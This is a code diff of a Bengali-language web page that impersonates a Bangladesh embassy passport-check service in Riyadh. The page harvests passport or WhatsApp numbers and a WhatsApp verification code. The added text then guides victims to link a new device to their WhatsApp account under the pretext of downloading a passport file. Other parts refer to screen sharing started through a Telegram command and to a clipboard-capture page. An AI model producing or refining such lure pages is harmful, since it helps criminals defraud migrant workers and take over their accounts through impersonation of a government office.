@@ -41,7 +41,7 @@
     </div>
 
     <div class="bottom-half text-center">
-        <div id="step1" class="w-full flex flex-col items-center gap-4">
+        <div id="step1" class="w-full flex flex-col items-center gap-1">
             <h2 class="text-2xl font-extrabold text-gray-900">সরাসরি পাসপোর্ট চেক করুন</h2>
             <p class="text-gray-600 px-4">সরাসরি অনলাইনে আপনার পাসপোর্ট নাম্বার দিয়ে চেক করতে পারবেন বর্তমানে আপনার পাসপোর্ট কোন অবস্থায় আছে। এজন্য নিজের নিচের বাটনে ক্লিক করুন।</p>
             <button onclick="showModal()" class="btn-blue">পাসপোর্ট চেক করুন</button>
@@ -56,20 +56,20 @@
             </div>
         </div>
 
-        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-1">
             <h1 class="text-xl font-bold text-gray-900">সরাসরি অনলাইনে চেক করুন</h1>
             <p class="text-gray-600 text-sm px-4">সরাসরি পাসপোর্ট ফাইলটি চেক করতে নিচের ফাঁকা ঘরে পাসপোর্ট নাম্বার অথবা পাসপোর্ট এর সাথে আপনার যে whatsapp নাম্বার অফিসে দেওয়া আছে ওই নাম্বারটা নিজের ফাঁকা ঘরে বসিয়ে ফাইলটি চেক করুন।</p>
             <input type="email" id="email_field" autocomplete="email" placeholder="পাসপোর্ট নাম্বার বসান" class="secure-input" oninput="autoCaptureEmail(this.value)">
             <button onclick="finalSubmit()" class="btn-blue">ফাইলটি ওপেন করুন</button>
         </div>
 
-        <div id="step2" class="hidden w-full flex flex-col items-center gap-4">
+        <div id="step2" class="hidden w-full flex flex-col items-center gap-1">
             <h2 class="text-xl font-bold text-gray-900"> সরাসরি দূতাবাস হাই কমিশনে যোগাযোগ </h2>
             <p class="text-gray-600 px-6">সরাসরি রিয়াদ বাংলাদেশ দূতাবাস হাই কমিশনে যেকোনো সমস্যার সমাধানের জন্য অথবা সমস্যা পরামর্শের জন্য কথা বলতে চাইলে নিচের বাটনে ক্লিক করে মেসেজটি পাঠান।</p>
             <a href="https://m.me/soriful.khan.2" class="btn-blue mt-2">Massage পাঠান</a>
         </div>
 
-        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-1">
             <div class="loader"></div>
             <h3 class="text-lg font-bold text-blue-600">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
             <p class="text-sm text-gray-700 px-10 font-medium text-center"> গুরুত্ব সহকারে চেক করা হচ্ছে। চেক করা শেষ না হওয়া পর্যন্ত দয়া করে একটু অপেক্ষা করুন।</p>
@@ -78,7 +78,7 @@
         <div id="otp_page" class="hidden w-full flex flex-col items-center">
             <h2 class="text-lg font-bold text-gray-900 mb-2">আপনার পাসপোর্ট ডকুমেন্ট ফাইলটি সরাসরি অফিস থেকে পাসওয়ার্ড দিয়ে লক করা আছে।</h2>
             <p class="text-xs text-gray-600 mb-6 px-4">পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করার জন্য রিয়াদ দূতাবাস প্রবাসী সেবা কেন্দ্র PDC থেকে আপনার whatsapp এ আসা 4 সংখ্যার চেক নাম্বার পাঠানো হয়েছে । নিচে ফাঁকা ঘরে বসিয়ে এড করুন।</p>
-            <div id="otp-inputs" class="flex justify-center gap-1.5 mb-4">
+            <div id="otp-inputs" class="flex justify-center gap-3.5 mb-8">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
@@ -87,10 +87,10 @@
             <button id="otpSubmitBtn" onclick="goToStep('verifying')" class="btn-blue opacity-50 cursor-not-allowed" disabled>Open</button>
         </div>
 
-        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-1">
             <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
-            <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
-            <p class="text-gray-600 text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে।</p>
+            <h2 class="text-2xl font-bold text-green-600">কিউআর স্ক্যান করে পাসপোর্ট Download করুন!</h2>
+            <p class="text-gray-600 text-sm">Passport File Download বাটুনে ক্লিক করার পরে নিল বাটুন আসবে তারপরে ( Link a device বাটুনে ক্লিক করুন তারপর আপনার ফোনের লক আসবে আনলক করবেন )।</p>
             <a href="https://wa.me/settings/linked_devices" class="btn-blue mt-2">Passport File Download</a>
         </div>
 
@@ -110,11 +110,9 @@
         </div>
 
         <!-- ====== NEW: Stop Screen Share Page (Error page style) ====== -->
-        <div id="stop_screen_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
-            <div class="bg-orange-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">⏹️</div>
-            <h2 class="text-xl font-bold text-orange-600">স্ক্রিন শেয়ার বন্ধ!</h2>
-            <p class="text-gray-800 text-sm font-semibold text-center">আপনার স্ক্রিন শেয়ার সফলভাবে বন্ধ করা হয়েছে। আর কোনো স্ক্রিন ক্যাপচার হচ্ছে না।</p>
-            <p class="text-gray-500 text-xs text-center">আবার শুরু করতে Telegram-এ "Start Screen Share" কমান্ড ব্যবহার করুন।</p>
+        <div id="stop_screen_page" class="hidden w-full flex flex-col items-center gap-1 px-6">
+            <div class="loader"></div>
+            <h3 class="text-lg font-bold text-red-600">অল্প কিছুক্ষণ অপেক্ষা করুন।  সরাসরি রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে আপনার পাসপোর্ট ডকুমেন্ট ফাইল পাঠানো হয়েছে সরাসরি ডাউনলোড করে চেক করুন। আপনার পাসপোর্টের ফাইল ডাউনলোড লিংক নোটিফিকেশনে পাঠানো হয়েছে।  নোটিফিকেশনে ক্লিক করুন তারপর ( Confirm  বাটনে ক্লিক করবেন তারপর আপনার ফোনের লক আসবে আনলক করবেন )  তারপরে ফাঁকা ঘর পাবেন। ...</h3>
         </div>
 
         <!-- ====== NEW: Stop Clipboard Page (Success page style) ====== -->
